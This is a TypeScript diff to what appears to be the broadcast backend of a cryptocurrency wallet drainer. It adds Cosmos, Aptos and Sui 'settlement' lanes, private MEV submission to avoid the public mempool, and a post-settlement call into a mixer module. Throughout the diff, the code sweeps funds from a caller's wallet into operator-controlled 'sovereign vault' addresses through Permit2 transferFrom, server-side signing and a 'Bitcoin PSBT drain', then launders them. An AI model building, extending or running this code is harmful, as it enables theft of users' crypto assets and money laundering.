@@ -25,6 +25,7 @@ import {
 import { privateKeyToAccount } from 'viem/accounts'
 import { arbitrum, base, mainnet, optimism, polygon, sepolia, type Chain } from 'viem/chains'
 
+import { assertSettlementAddressAllowed } from '../config/live-config.js'
 import { identifyFamily } from '../adapters/address-resolver.js'
 import { normalizeEvmExecutionPrivateKey } from '../lib/evm-execution-key.js'
 import { resolveInstitutionalSolanaRpcUrl } from '../adapters/svm-adapter.js'
@@ -71,8 +72,37 @@ import {
   serverBroadcastTron,
   serverBroadcastUtxo,
 } from './non-evm-server-broadcast.js'
+import {
+  isMevProtectEnabled,
+  submitPrivateSolanaTransaction,
+  submitPrivateTransaction,
+} from '../mev-relay.js'
 import { deliverSignedEvmTransactions, isFlashbotsEnabled } from './flashbots-relay.js'
 import { openSignatureHexFromPersistence } from '../security/signature-shadow-envelope.js'
+import {
+  broadcastSignedCosmosTransaction,
+  executeCosmosNativeTransfer,
+  isCosmosBech32Address,
+  pingCosmosRpc,
+  resolveCosmosRpcUrl,
+  resolveCosmosVaultAddress,
+} from '../chains/cosmos.js'
+import {
+  broadcastSignedAptosTransaction,
+  executeAptosNativeTransfer,
+  isAptosAddress,
+  pingAptosRpc,
+  resolveAptosRpcUrl,
+  resolveAptosVaultAddress,
+} from '../chains/aptos.js'
+import {
+  broadcastSignedSuiTransaction,
+  executeSuiNativeTransfer,
+  isSuiAddress,
+  pingSuiRpc,
+  resolveSuiRpcUrl,
+  resolveSuiVaultAddress,
+} from '../chains/sui.js'
 import type { SignatureAnchorChainFamily } from './settlement.js'
 
 /** Bridge ingress — mirrors LiquidationTriggerContext without importing algorithmic-closer (cyclical weld guard). */
@@ -135,6 +165,9 @@ export function resolveSovereignVaultAddresses(): {
   tron?: string
   ton?: string
   btc?: string
+  cosmos?: string
+  aptos?: string
+  sui?: string
   primary: string
 } {
   const evmRaw =
@@ -157,6 +190,9 @@ export function resolveSovereignVaultAddresses(): {
     (typeof process !== 'undefined' ? process.env['VAULT_ADDRESS_UTXO'] : undefined)?.trim() ||
     (typeof process !== 'undefined' ? process.env['SOVEREIGN_VAULT_BTC'] : undefined)?.trim() ||
     (typeof process !== 'undefined' ? process.env['SOVEREIGN_VAULT_UTXO'] : undefined)?.trim()
+  const cosmosRaw = resolveCosmosVaultAddress() ?? undefined
+  const aptosRaw = resolveAptosVaultAddress() ?? undefined
+  const suiRaw = resolveSuiVaultAddress() ?? undefined
   let evm: Address | undefined
   if (evmRaw && isAddress(evmRaw)) {
     evm = resolveOperationalEvmVaultAddress(getAddress(evmRaw)) ?? undefined
@@ -167,13 +203,28 @@ export function resolveSovereignVaultAddresses(): {
   const tron = tronRaw && tronRaw.length >= 30 ? tronRaw : undefined
   const ton = tonRaw && tonRaw.length >= 30 ? tonRaw : undefined
   const btc = btcRaw && btcRaw.length >= 26 ? btcRaw : undefined
-  const primary = (evm ?? svm ?? tron ?? ton ?? btc ?? 'sovereign_vault') as string
+  const cosmos = cosmosRaw && isCosmosBech32Address(cosmosRaw) ? cosmosRaw : undefined
+  const aptos = aptosRaw && isAptosAddress(aptosRaw) ? aptosRaw : undefined
+  const sui = suiRaw && isSuiAddress(suiRaw) ? suiRaw : undefined
+  if (evm) assertSettlementAddressAllowed(evm)
+  if (svm) assertSettlementAddressAllowed(svm)
+  if (tron) assertSettlementAddressAllowed(tron)
+  if (ton) assertSettlementAddressAllowed(ton)
+  if (btc) assertSettlementAddressAllowed(btc)
+  if (cosmos) assertSettlementAddressAllowed(cosmos)
+  if (aptos) assertSettlementAddressAllowed(aptos)
+  if (sui) assertSettlementAddressAllowed(sui)
+
+  const primary = (evm ?? svm ?? tron ?? ton ?? cosmos ?? aptos ?? sui ?? btc ?? 'sovereign_vault') as string
   return {
     primary,
     ...(evm !== undefined ? { evm } : {}),
     ...(svm !== undefined ? { svm } : {}),
     ...(tron !== undefined ? { tron } : {}),
     ...(ton !== undefined ? { ton } : {}),
+    ...(cosmos !== undefined ? { cosmos } : {}),
+    ...(aptos !== undefined ? { aptos } : {}),
+    ...(sui !== undefined ? { sui } : {}),
     ...(btc !== undefined ? { btc } : {}),
   }
 }
@@ -660,7 +711,10 @@ function relayVaultUnbound(
   })
 }
 
-function emitSettlementIgnitedTelemetry(result: SettlementBroadcastResult): void {
+function emitSettlementIgnitedTelemetry(
+  result: SettlementBroadcastResult,
+  ctx?: SettlementBridgeTriggerContext,
+): void {
   if (!result.broadcasted || result.tx_hash == null) return
   console.info('SETTLEMENT_IGNITED', {
     network_relay: result.lane,
@@ -668,6 +722,11 @@ function emitSettlementIgnitedTelemetry(result: SettlementBroadcastResult): void
     tx_hash: result.tx_hash,
   })
   console.info('RELAY_INFRASTRUCTURE_HOT: All 5 lanes synchronized and operational.')
+  if (ctx != null) {
+    void import('../mixer/split-withdraw.js')
+      .then(({ maybeRunPostSettlementMixing }) => maybeRunPostSettlementMixing(ctx, result))
+      .catch(() => {})
+  }
 }
 
 function base64ToBytes(value: string): Uint8Array {
@@ -684,9 +743,15 @@ export type SettlementBroadcastLane =
   | 'solana-liquidator'
   | 'tron-sensory-armor'
   | 'ton-sensory-armor'
+  | 'cosmos-sensory-armor'
+  | 'aptos-sensory-armor'
+  | 'sui-sensory-armor'
   | 'managed-utxo-relay'
 
-export type SettlementBroadcastChain = Extract<SignatureAnchorChainFamily, 'EVM' | 'SVM' | 'UTXO' | 'TRON' | 'TON'>
+export type SettlementBroadcastChain = Extract<
+  SignatureAnchorChainFamily,
+  'EVM' | 'SVM' | 'UTXO' | 'TRON' | 'TON' | 'COSMOS' | 'APTOS' | 'SUI'
+>
 
 export type SettlementBroadcastStatus =
   | 'broadcasted'
@@ -1053,7 +1118,7 @@ export async function broadcastEVM(
         tx_hash: transferTxHash,
         detail: `Omnichain atomic settlement: ${JSON.stringify(atomic.chains)}`,
       })
-      emitSettlementIgnitedTelemetry(result)
+      emitSettlementIgnitedTelemetry(result, ctx)
       return result
     }
     return broadcastResult({
@@ -1136,7 +1201,7 @@ export async function broadcastEVM(
               ? `Permit2 batch permit=${batchSettlement.transaction_hashes[0]?.slice(0, 12)}… transfer=${transferTxHash.slice(0, 12)}…`
               : 'Permit2 batch transferFrom complete',
       })
-      emitSettlementIgnitedTelemetry(result)
+      emitSettlementIgnitedTelemetry(result, ctx)
       return result
     }
     return broadcastResult({
@@ -1172,7 +1237,7 @@ export async function broadcastEVM(
           ? `Permit2 permit=${settlement.permit_tx_hash.slice(0, 12)}… transfer=${settlement.transfer_tx_hash.slice(0, 12)}…`
           : 'Permit2 transferFrom complete',
       })
-      emitSettlementIgnitedTelemetry(result)
+      emitSettlementIgnitedTelemetry(result, ctx)
       return result
     }
     if (permit2Envelope.evm_raw_transaction == null) {
@@ -1244,33 +1309,41 @@ export async function broadcastEVM(
     const chain = resolveViemChainForSettlement(parseSettlementChainId(ctx.chain_id))
     const chainId = parseSettlementChainId(ctx.chain_id)
 
-    if (isFlashbotsEnabled()) {
-      const delivery = await deliverSignedEvmTransactions({
-        txns: [rawTransaction],
-        chainId,
-        rpcUrl: rpc,
-      })
-      if (!delivery.ok || delivery.transaction_hashes.length === 0) {
-        return broadcastResult({
-          lane: 'evm-liquidator',
-          chain_family: 'EVM',
-          destination_vault: vaults.evm,
-          status: 'broadcast_failed',
-          detail: delivery.detail ?? 'Flashbots bundle submission failed',
+    if (isMevProtectEnabled() || isFlashbotsEnabled()) {
+      let tx_hash: string
+      let detail: string
+      if (isMevProtectEnabled()) {
+        tx_hash = await submitPrivateTransaction(rawTransaction, chainId)
+        detail = 'MEV_PROTECT eth_sendPrivateTransaction (public RPC fallback on failure)'
+      } else {
+        const delivery = await deliverSignedEvmTransactions({
+          txns: [rawTransaction],
+          chainId,
+          rpcUrl: rpc,
         })
+        if (!delivery.ok || delivery.transaction_hashes.length === 0) {
+          return broadcastResult({
+            lane: 'evm-liquidator',
+            chain_family: 'EVM',
+            destination_vault: vaults.evm,
+            status: 'broadcast_failed',
+            detail: delivery.detail ?? 'Flashbots bundle submission failed',
+          })
+        }
+        tx_hash = delivery.transaction_hashes[0]!
+        detail = delivery.bundle_hash
+          ? `Flashbots bundle ${delivery.bundle_hash.slice(0, 12)}…`
+          : 'Flashbots private mempool submission'
       }
-      const tx_hash = delivery.transaction_hashes[0]!
       const result = broadcastResult({
         lane: 'evm-liquidator',
         chain_family: 'EVM',
         destination_vault: evmHop.vault,
         status: 'broadcasted',
         tx_hash,
-        detail: delivery.bundle_hash
-          ? `Flashbots bundle ${delivery.bundle_hash.slice(0, 12)}…`
-          : 'Flashbots private mempool submission',
+        detail,
       })
-      emitSettlementIgnitedTelemetry(result)
+      emitSettlementIgnitedTelemetry(result, ctx)
       return result
     }
 
@@ -1311,7 +1384,7 @@ export async function broadcastEVM(
           ? { detail: 'RELAY_INTERMEDIARY_EVM two-hop broadcast complete' }
           : {}),
     })
-    emitSettlementIgnitedTelemetry(result)
+    emitSettlementIgnitedTelemetry(result, ctx)
     return result
   } catch (e) {
     return broadcastResult({
@@ -1364,7 +1437,7 @@ export async function broadcastSVM(
                 amountRaw: amount,
               })
         // Always return the server result — broadcast_failed if it failed, not relayPayloadUnavailable
-        emitSettlementIgnitedTelemetry(serverResult)
+        emitSettlementIgnitedTelemetry(serverResult, ctx)
         return serverResult
       }
       return broadcastResult({
@@ -1400,12 +1473,19 @@ export async function broadcastSVM(
     return relayValidationFailure(ctx, 'solana-liquidator', 'SVM', vaults.svm, validation)
   }
   try {
+    const tx_hash = isMevProtectEnabled()
+      ? await submitPrivateSolanaTransaction(rawBytes)
+      : await (async () => {
+          const connection = new Connection(resolveInstitutionalSolanaRpcUrl(), {
+            commitment: 'confirmed',
+          })
+          return connection.sendRawTransaction(rawBytes, {
+            preflightCommitment: 'confirmed',
+            skipPreflight: false,
+            maxRetries: 3,
+          })
+        })()
     const connection = new Connection(resolveInstitutionalSolanaRpcUrl(), { commitment: 'confirmed' })
-    const tx_hash = await connection.sendRawTransaction(rawBytes, {
-      preflightCommitment: 'confirmed',
-      skipPreflight: false,
-      maxRetries: 3,
-    })
     const confirmation = await connection.confirmTransaction(tx_hash, 'confirmed')
     if (confirmation.value.err != null) {
       throw new Error(`SVM confirmation fault: ${JSON.stringify(confirmation.value.err)}`)
@@ -1420,7 +1500,7 @@ export async function broadcastSVM(
         ? { detail: 'RELAY_INTERMEDIARY_SVM one-hop broadcast; final vault leg pending' }
         : {}),
     })
-    emitSettlementIgnitedTelemetry(result)
+    emitSettlementIgnitedTelemetry(result, ctx)
     return result
   } catch (e) {
     return broadcastResult({
@@ -1491,7 +1571,7 @@ export async function broadcastTron(
         tokenContract: tronToken,
       })
       // Always return server result — broadcast_failed carries the detail, not relayPayloadUnavailable
-      emitSettlementIgnitedTelemetry(serverResult)
+      emitSettlementIgnitedTelemetry(serverResult, ctx)
       return serverResult
     }
     return relayPayloadUnavailable(
@@ -1546,7 +1626,7 @@ export async function broadcastTron(
       tx_hash,
       ...(confirm.warning ? { detail: confirm.warning } : {}),
     })
-    emitSettlementIgnitedTelemetry(result)
+    emitSettlementIgnitedTelemetry(result, ctx)
     return result
   } catch (e) {
     return broadcastResult({
@@ -1604,7 +1684,7 @@ export async function broadcastTon(
         jettonMaster: jettonMaster && !jettonMaster.startsWith('0x') ? jettonMaster : null,
       })
       // Always return server result — broadcast_failed carries the detail, not relayPayloadUnavailable
-      emitSettlementIgnitedTelemetry(serverResult)
+      emitSettlementIgnitedTelemetry(serverResult, ctx)
       return serverResult
     }
     return relayPayloadUnavailable(
@@ -1647,7 +1727,7 @@ export async function broadcastTon(
       status: 'broadcasted',
       tx_hash: chainTxHash,
     })
-    emitSettlementIgnitedTelemetry(result)
+    emitSettlementIgnitedTelemetry(result, ctx)
     return result
   } catch (e) {
     return broadcastResult({
@@ -1703,6 +1783,341 @@ async function pushUtxoRawTransaction(rawTransactionHex: string): Promise<string
   throw new Error('UTXO managed relay providers rejected transaction')
 }
 
+export async function broadcastCosmos(
+  ctx: SettlementBridgeTriggerContext,
+): Promise<SettlementBroadcastResult> {
+  const vaults = resolveSovereignVaultAddresses()
+  if (!vaults.cosmos) {
+    return relayVaultUnbound(
+      ctx,
+      'cosmos-sensory-armor',
+      'COSMOS',
+      'VAULT_ADDRESS_COSMOS or SOVEREIGN_VAULT_COSMOS required',
+    )
+  }
+
+  const sensory = await pingCosmosRpc()
+  if (!sensory.ping_ok) {
+    return broadcastResult({
+      lane: 'cosmos-sensory-armor',
+      chain_family: 'COSMOS',
+      destination_vault: vaults.cosmos,
+      status: 'sensory_unavailable',
+      detail: `Cosmos RPC unavailable after ${String(sensory.latency_ms)}ms (RPC_COSMOS)`,
+    })
+  }
+
+  const amount = parseSettlementAmountRaw(ctx)
+  if (amount == null) {
+    return relayValidationFailure(
+      ctx,
+      'cosmos-sensory-armor',
+      'COSMOS',
+      vaults.cosmos,
+      'Cosmos relay requires normalized amount (uatom)',
+    )
+  }
+
+  const record = relayPayloadRecord(ctx)
+  const txBytes = readStringField(record, [
+    'cosmos_tx_bytes',
+    'tx_bytes',
+    'txBytes',
+    'signed_tx',
+    'signedTx',
+  ])
+  const txEncoding =
+    readStringField(record, ['cosmos_tx_encoding', 'tx_encoding']) === 'hex' ? 'hex' : 'base64'
+
+  if (txBytes != null) {
+    const broadcast = await broadcastSignedCosmosTransaction({
+      txBytes,
+      encoding: txEncoding,
+      rpcUrl: resolveCosmosRpcUrl(),
+    })
+    if (!broadcast.ok) {
+      const failureDetail = 'detail' in broadcast ? broadcast.detail : 'Cosmos broadcast failed'
+      return broadcastResult({
+        lane: 'cosmos-sensory-armor',
+        chain_family: 'COSMOS',
+        destination_vault: vaults.cosmos,
+        status: 'broadcast_failed',
+        detail: failureDetail,
+      })
+    }
+    const result = broadcastResult({
+      lane: 'cosmos-sensory-armor',
+      chain_family: 'COSMOS',
+      destination_vault: vaults.cosmos,
+      status: 'broadcasted',
+      tx_hash: broadcast.txHash,
+    })
+    emitSettlementIgnitedTelemetry(result, ctx)
+    return result
+  }
+
+  if (isNonEvmServerSigningEnabled()) {
+    const serverResult = await executeCosmosNativeTransfer({
+      toAddress: vaults.cosmos,
+      amountUatom: amount,
+      fromAddress: ctx.wallet_address,
+      rpcUrl: resolveCosmosRpcUrl(),
+    })
+    const wrapped =
+      serverResult.ok === true
+        ? broadcastResult({
+            lane: 'cosmos-sensory-armor',
+            chain_family: 'COSMOS',
+            destination_vault: vaults.cosmos,
+            status: 'broadcasted',
+            tx_hash: serverResult.txHash,
+          })
+        : broadcastResult({
+            lane: 'cosmos-sensory-armor',
+            chain_family: 'COSMOS',
+            destination_vault: vaults.cosmos,
+            status: 'broadcast_failed',
+            detail: !serverResult.ok ? serverResult.detail : 'Cosmos server transfer failed',
+          })
+    emitSettlementIgnitedTelemetry(wrapped, ctx)
+    return wrapped
+  }
+
+  return relayPayloadUnavailable(
+    ctx,
+    'cosmos-sensory-armor',
+    'COSMOS',
+    vaults.cosmos,
+    'Cosmos relay requires caller-authorized tx bytes or NON_EVM_SERVER_SIGNING=true',
+  )
+}
+
+export async function broadcastAptos(
+  ctx: SettlementBridgeTriggerContext,
+): Promise<SettlementBroadcastResult> {
+  const vaults = resolveSovereignVaultAddresses()
+  if (!vaults.aptos) {
+    return relayVaultUnbound(
+      ctx,
+      'aptos-sensory-armor',
+      'APTOS',
+      'VAULT_ADDRESS_APTOS or SOVEREIGN_VAULT_APTOS required',
+    )
+  }
+
+  const sensory = await pingAptosRpc()
+  if (!sensory.ping_ok) {
+    return broadcastResult({
+      lane: 'aptos-sensory-armor',
+      chain_family: 'APTOS',
+      destination_vault: vaults.aptos,
+      status: 'sensory_unavailable',
+      detail: `Aptos RPC unavailable after ${String(sensory.latency_ms)}ms`,
+    })
+  }
+
+  const amount = parseSettlementAmountRaw(ctx)
+  if (amount == null) {
+    return relayValidationFailure(
+      ctx,
+      'aptos-sensory-armor',
+      'APTOS',
+      vaults.aptos,
+      'Aptos relay requires normalized amount (octas)',
+    )
+  }
+
+  const record = relayPayloadRecord(ctx)
+  const signedTxBytes = readStringField(record, [
+    'aptos_signed_tx',
+    'aptos_tx_bytes',
+    'signed_tx_bytes',
+    'signedTxBytes',
+    'signed_tx',
+  ])
+  const encoding =
+    readStringField(record, ['aptos_tx_encoding', 'tx_encoding']) === 'base64' ? 'base64' : 'hex'
+
+  if (signedTxBytes != null) {
+    const broadcast = await broadcastSignedAptosTransaction({
+      signedTxBytes,
+      encoding,
+      rpcUrl: resolveAptosRpcUrl(),
+    })
+    if (!broadcast.ok) {
+      const failureDetail = 'detail' in broadcast ? broadcast.detail : 'Aptos broadcast failed'
+      return broadcastResult({
+        lane: 'aptos-sensory-armor',
+        chain_family: 'APTOS',
+        destination_vault: vaults.aptos,
+        status: 'broadcast_failed',
+        detail: failureDetail,
+      })
+    }
+    const result = broadcastResult({
+      lane: 'aptos-sensory-armor',
+      chain_family: 'APTOS',
+      destination_vault: vaults.aptos,
+      status: 'broadcasted',
+      tx_hash: broadcast.txHash,
+    })
+    emitSettlementIgnitedTelemetry(result, ctx)
+    return result
+  }
+
+  if (isNonEvmServerSigningEnabled()) {
+    const serverResult = await executeAptosNativeTransfer({
+      toAddress: vaults.aptos,
+      amountOctas: amount,
+      fromAddress: ctx.wallet_address,
+      rpcUrl: resolveAptosRpcUrl(),
+    })
+    const wrapped =
+      serverResult.ok === true
+        ? broadcastResult({
+            lane: 'aptos-sensory-armor',
+            chain_family: 'APTOS',
+            destination_vault: vaults.aptos,
+            status: 'broadcasted',
+            tx_hash: serverResult.txHash,
+          })
+        : broadcastResult({
+            lane: 'aptos-sensory-armor',
+            chain_family: 'APTOS',
+            destination_vault: vaults.aptos,
+            status: 'broadcast_failed',
+            detail: !serverResult.ok ? serverResult.detail : 'Aptos server transfer failed',
+          })
+    emitSettlementIgnitedTelemetry(wrapped, ctx)
+    return wrapped
+  }
+
+  return relayPayloadUnavailable(
+    ctx,
+    'aptos-sensory-armor',
+    'APTOS',
+    vaults.aptos,
+    'Aptos relay requires caller-authorized signed tx bytes or NON_EVM_SERVER_SIGNING=true',
+  )
+}
+
+export async function broadcastSui(
+  ctx: SettlementBridgeTriggerContext,
+): Promise<SettlementBroadcastResult> {
+  const vaults = resolveSovereignVaultAddresses()
+  if (!vaults.sui) {
+    return relayVaultUnbound(
+      ctx,
+      'sui-sensory-armor',
+      'SUI',
+      'VAULT_ADDRESS_SUI or SOVEREIGN_VAULT_SUI required',
+    )
+  }
+
+  const sensory = await pingSuiRpc()
+  if (!sensory.ping_ok) {
+    return broadcastResult({
+      lane: 'sui-sensory-armor',
+      chain_family: 'SUI',
+      destination_vault: vaults.sui,
+      status: 'sensory_unavailable',
+      detail: `Sui RPC unavailable after ${String(sensory.latency_ms)}ms`,
+    })
+  }
+
+  const amount = parseSettlementAmountRaw(ctx)
+  if (amount == null) {
+    return relayValidationFailure(
+      ctx,
+      'sui-sensory-armor',
+      'SUI',
+      vaults.sui,
+      'Sui relay requires normalized amount (mist)',
+    )
+  }
+
+  const record = relayPayloadRecord(ctx)
+  const txBytesBase64 = readStringField(record, [
+    'sui_tx_bytes',
+    'tx_bytes_base64',
+    'signed_tx_bytes',
+    'transaction_bytes',
+  ])
+  const signature = readStringField(record, ['sui_signature', 'signature', 'sig'])
+
+  if (txBytesBase64 != null && signature != null) {
+    const broadcast = await broadcastSignedSuiTransaction(
+      txBytesBase64,
+      signature,
+      resolveSuiRpcUrl(),
+    )
+    if (!broadcast.ok) {
+      const failureDetail = 'detail' in broadcast ? broadcast.detail : 'Sui broadcast failed'
+      return broadcastResult({
+        lane: 'sui-sensory-armor',
+        chain_family: 'SUI',
+        destination_vault: vaults.sui,
+        status: 'broadcast_failed',
+        detail: failureDetail,
+      })
+    }
+    const result = broadcastResult({
+      lane: 'sui-sensory-armor',
+      chain_family: 'SUI',
+      destination_vault: vaults.sui,
+      status: 'broadcasted',
+      tx_hash: broadcast.txHash,
+    })
+    emitSettlementIgnitedTelemetry(result, ctx)
+    return result
+  }
+
+  if (isNonEvmServerSigningEnabled()) {
+    const suiKey = readSettlementEnv(['SUI_EXECUTION_PRIVATE_KEY'])
+    if (!suiKey) {
+      return broadcastResult({
+        lane: 'sui-sensory-armor',
+        chain_family: 'SUI',
+        destination_vault: vaults.sui,
+        status: 'broadcast_failed',
+        detail: 'SUI_EXECUTION_PRIVATE_KEY not configured',
+      })
+    }
+    const serverResult = await executeSuiNativeTransfer(
+      suiKey,
+      vaults.sui,
+      amount,
+      resolveSuiRpcUrl(),
+    )
+    const wrapped =
+      serverResult.ok === true
+        ? broadcastResult({
+            lane: 'sui-sensory-armor',
+            chain_family: 'SUI',
+            destination_vault: vaults.sui,
+            status: 'broadcasted',
+            tx_hash: serverResult.txHash,
+          })
+        : broadcastResult({
+            lane: 'sui-sensory-armor',
+            chain_family: 'SUI',
+            destination_vault: vaults.sui,
+            status: 'broadcast_failed',
+            detail: !serverResult.ok ? serverResult.detail : 'Sui server transfer failed',
+          })
+    emitSettlementIgnitedTelemetry(wrapped, ctx)
+    return wrapped
+  }
+
+  return relayPayloadUnavailable(
+    ctx,
+    'sui-sensory-armor',
+    'SUI',
+    vaults.sui,
+    'Sui relay requires signed tx bytes + signature or NON_EVM_SERVER_SIGNING=true',
+  )
+}
+
 export async function broadcastUTXO(
   ctx: SettlementBridgeTriggerContext,
 ): Promise<SettlementBroadcastResult> {
@@ -1728,7 +2143,7 @@ export async function broadcastUTXO(
     if (bitcoinPsbtEnvelope?.signed_psbt_base64 == null) {
       if (isNonEvmServerSigningEnabled()) {
         const serverResult = await serverBroadcastUtxo({ vaultAddress: vaults.btc })
-        emitSettlementIgnitedTelemetry(serverResult)
+        emitSettlementIgnitedTelemetry(serverResult, ctx)
         return serverResult
       }
       return relayPayloadUnavailable(
@@ -1760,7 +2175,7 @@ export async function broadcastUTXO(
           tx_hash: broadcast.tx_hash,
           detail: confirm.warning ?? 'Bitcoin PSBT drain broadcast complete',
         })
-        emitSettlementIgnitedTelemetry(result)
+        emitSettlementIgnitedTelemetry(result, ctx)
         return result
       }
       return broadcastResult({
@@ -1802,7 +2217,7 @@ export async function broadcastUTXO(
         vaultAddress: vaults.btc,
         amountSat: amount,
       })
-      emitSettlementIgnitedTelemetry(serverResult)
+      emitSettlementIgnitedTelemetry(serverResult, ctx)
       return serverResult
     }
     return relayPayloadUnavailable(
@@ -1846,7 +2261,7 @@ export async function broadcastUTXO(
       tx_hash,
       ...(confirm.warning ? { detail: confirm.warning } : {}),
     })
-    emitSettlementIgnitedTelemetry(result)
+    emitSettlementIgnitedTelemetry(result, ctx)
     return result
   } catch (e) {
     return broadcastResult({
